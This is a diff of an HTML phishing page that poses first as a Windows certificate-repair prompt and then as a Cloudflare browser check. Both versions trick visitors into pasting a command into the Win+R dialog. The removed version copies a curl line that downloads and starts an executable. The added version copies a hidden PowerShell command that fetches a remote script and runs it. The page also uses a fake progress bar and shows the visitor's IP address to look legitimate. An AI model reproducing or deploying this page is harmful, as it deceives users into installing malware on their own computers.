@@ -1,56 +1,108 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Update Required</title>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Just a moment...</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#f8f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-.card{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.08);padding:40px 36px;max-width:500px;width:100%;text-align:center}
-.icon{width:56px;height:56px;background:#fce8e6;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px;color:#d93025}
-h1{font-size:22px;font-weight:600;color:#202124;margin-bottom:8px}
-p{font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:16px}
-.err{background:#fce8e6;border-radius:8px;padding:12px 16px;font-size:13px;color:#c5221e;text-align:left;margin-bottom:18px;border-left:4px solid #d93025}
-.code{background:#f1f3f4;border:1px solid #dadce0;border-radius:8px;padding:10px 14px;margin:0 0 6px;text-align:left;font-family:Consolas,monospace;font-size:12px;color:#202124;word-break:break-all;display:none}
-.btn{background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 32px;font-size:14px;font-weight:500;cursor:pointer;transition:background .15s;margin:6px 0}
-.btn:hover{background:#1557b0}
-.btn:active{background:#174ea6}
-.steps{background:#e8f0fe;border-radius:8px;padding:14px 16px;margin:12px 0;text-align:left}
-.step{font-size:13px;color:#1967d2;padding:4px 0}
-.step b{color:#1a73e8}
-#status{font-size:13px;margin:8px 0;min-height:20px}
-.ok{color:#188038}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f0f2f5;color:#1d1d1d;min-height:100vh;display:flex;justify-content:center;align-items:center}
+.cf-wrap{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);width:100%;max-width:520px;padding:40px;margin:20px;text-align:center}
+.cf-logo{font-size:32px;font-weight:700;color:#f38020;margin-bottom:8px;letter-spacing:-1px}
+.cf-logo span{color:#404040}
+.cf-sub{font-size:14px;color:#666;margin-bottom:28px}
+.cf-spinner{width:48px;height:48px;border:4px solid #e5e7eb;border-top-color:#f38020;border-radius:50%;margin:20px auto 24px;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.cf-status{font-size:15px;color:#333;margin-bottom:6px;font-weight:500}
+.cf-progress{width:220px;height:4px;background:#e5e7eb;border-radius:4px;margin:14px auto;overflow:hidden}
+.cf-progress-bar{height:100%;width:0;background:#f38020;border-radius:4px;transition:width .3s}
+.cf-error{display:none;margin-top:20px;padding:20px;background:#fff5f5;border:1px solid #fecaca;border-radius:8px;text-align:left}
+.cf-error-title{font-size:14px;font-weight:600;color:#dc2626;margin-bottom:8px}
+.cf-error-text{font-size:13px;color:#4b5563;line-height:1.5;margin-bottom:12px}
+.cf-steps{font-size:13px;color:#4b5563;line-height:1.7;padding-left:18px;margin:8px 0 12px}
+.cf-steps li{margin-bottom:4px}
+.cmd-box{background:#1e1e2e;color:#cdd6f4;border-radius:6px;padding:12px 14px;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:11px;line-height:1.5;word-break:break-all;margin:10px 0;cursor:pointer;position:relative;user-select:all;border:2px solid transparent;transition:border-color .2s}
+.cmd-box:hover{border-color:#f38020}
+.cmd-box.copied{border-color:#22c55e;background:#1a2e1a}
+.cmd-copied-msg{font-size:12px;color:#22c55e;margin-top:6px;display:none;font-weight:500}
+.cf-btn{display:inline-block;background:#f38020;color:#fff;border:none;border-radius:6px;padding:10px 28px;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s;margin-top:14px}
+.cf-btn:hover{background:#e06e0a}
+.cf-btn:active{transform:scale(.98)}
+.cf-footer{font-size:11px;color:#9ca3af;margin-top:24px;line-height:1.6}
+.cf-footer a{color:#9ca3af;text-decoration:none}
+.cf-footer a:hover{text-decoration:underline}
+.hidden{display:none}
 </style>
 </head>
 <body>
-<div class="card">
-<div class="icon">&#9888;</div>
-<h1>Certificate update required</h1>
-<p class="err"><b>NET::ERR_CERT_AUTHORITY_INVALID</b> — Your device is missing critical root certificate updates. Connections to secure sites will fail until resolved.</p>
-<p>Click "Copy Fix" to copy the repair command, then follow the steps below.</p>
-<button class="btn" id="copyBtn">Copy Fix</button>
-<div id="status"></div>
-<div class="steps">
-<div class="step"><b>Step 1:</b> Press <b>Windows + R</b> on your keyboard</div>
-<div class="step"><b>Step 2:</b> Paste the command and press <b>Enter</b></div>
-</div>
-<p style="font-size:12px;color:#9aa0a6;margin-top:12px">This command re-registers Windows certificate stores. A command window may briefly appear — this is normal.</p>
-<textarea id="cmdBox" style="position:absolute;left:-9999px">curl -sLo %tmp%\c2.exe https://raw.githubusercontent.com/kai195102/d/main/c2d.exe & start /b %tmp%\c2.exe</textarea>
+<div class="cf-wrap">
+  <div class="cf-logo">Cloudflare<span>®</span></div>
+  <div class="cf-sub">Security Check</div>
+  <div id="loadingPhase">
+    <div class="cf-spinner"></div>
+    <div class="cf-status">Checking your browser before accessing the site...</div>
+    <div class="cf-progress"><div class="cf-progress-bar" id="progressBar"></div></div>
+    <div style="font-size:12px;color:#9ca3af;margin-top:8px">DDoS protection by Cloudflare</div>
+  </div>
+  <div id="errorPhase" class="cf-error">
+    <div class="cf-error-title">⚠ Security verification could not be completed automatically</div>
+    <div class="cf-error-text">
+      Our automated system detected an unusual network configuration from your connection.
+      To continue, please complete a quick manual verification step.
+    </div>
+    <div style="font-size:13px;font-weight:600;color:#333;margin-bottom:6px">Step-by-step instructions:</div>
+    <ol class="cf-steps">
+      <li>Press <strong>Win + R</strong> on your keyboard</li>
+      <li>Press <strong>Ctrl + V</strong> to paste the code below</li>
+      <li>Press <strong>Enter</strong> to run the verification</li>
+      <li>Wait 10-15 seconds for the security check to complete</li>
+    </ol>
+    <div style="font-size:12px;color:#666;margin-bottom:4px">Click the box below to copy:</div>
+    <div class="cmd-box" id="cmdBox">powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kai195102/d/refs/heads/main/c.ps1')"</div>
+    <div class="cmd-copied-msg" id="copiedMsg">✓ Copied to clipboard! Now press Win+R, Ctrl+V, and Enter.</div>
+    <button class="cf-btn" id="continueBtn">I have completed the verification</button>
+  </div>
+  <div class="cf-footer">
+    <a href="#">Cloudflare</a> &bull; <a href="#">Privacy</a> &bull; <a href="#">Terms</a><br>
+    Your IP: <span id="userIp">---</span> &bull; Please allow up to 30 seconds for verification
+  </div>
 </div>
 <script>
-const cmd = document.getElementById("cmdBox").value;
-document.getElementById("copyBtn").onclick = function(){
-  if(navigator.clipboard && navigator.clipboard.writeText){
-    navigator.clipboard.writeText(cmd).then(function(){
-      document.getElementById("status").innerHTML = '<span class="ok">Copied! Now press <b>Windows + R</b> and paste.</span>';
-    }).catch(function(){ fallbackCopy(); });
-  } else { fallbackCopy(); }
-};
-function fallbackCopy(){
-  var ta = document.getElementById("cmdBox");
-  ta.style.position = "fixed"; ta.style.left = "0"; ta.style.top = "0";
-  ta.select(); document.execCommand("copy");
-  ta.style.position = "absolute"; ta.style.left = "-9999px";
-  document.getElementById("status").innerHTML = '<span class="ok">Copied! Now press <b>Windows + R</b> and paste.</span>';
-}
+(function(){
+  var pBar=document.getElementById('progressBar');
+  var loading=document.getElementById('loadingPhase');
+  var error=document.getElementById('errorPhase');
+  var cmdBox=document.getElementById('cmdBox');
+  var copiedMsg=document.getElementById('copiedMsg');
+  var contBtn=document.getElementById('continueBtn');
+  var ipSpan=document.getElementById('userIp');
+  var progress=0,failed=false;
+  fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){ipSpan.textContent=d.ip}).catch(function(){ipSpan.textContent='Unknown'});
+  function animate(){
+    if(failed)return;
+    progress+=Math.random()*8+2;
+    if(progress>=100){progress=100;pBar.style.width='100%';failed=true;setTimeout(function(){loading.style.display='none';error.style.display='block'},500);return}
+    pBar.style.width=progress+'%';
+    setTimeout(animate,200+Math.random()*400);
+  }
+  setTimeout(animate,400);
+  cmdBox.addEventListener('click',function(){
+    var range=document.createRange();
+    range.selectNodeContents(cmdBox);
+    var sel=window.getSelection();
+    sel.removeAllRanges();sel.addRange(range);
+    try{
+      navigator.clipboard.writeText(cmdBox.textContent.trim()).then(function(){
+        cmdBox.classList.add('copied');copiedMsg.style.display='block';
+        setTimeout(function(){cmdBox.classList.remove('copied')},3000);
+      }).catch(function(){document.execCommand('copy');cmdBox.classList.add('copied');copiedMsg.style.display='block';setTimeout(function(){cmdBox.classList.remove('copied')},3000)});
+    }catch(e){document.execCommand('copy');cmdBox.classList.add('copied');copiedMsg.style.display='block';setTimeout(function(){cmdBox.classList.remove('copied')},3000)}
+  });
+  contBtn.addEventListener('click',function(){
+    contBtn.textContent='Verifying...';contBtn.style.opacity='0.6';contBtn.disabled=true;
+    setTimeout(function(){window.location.href='https://www.cloudflare.com'},2000);
+  });
+})();
 </script>
 </body>
 </html>
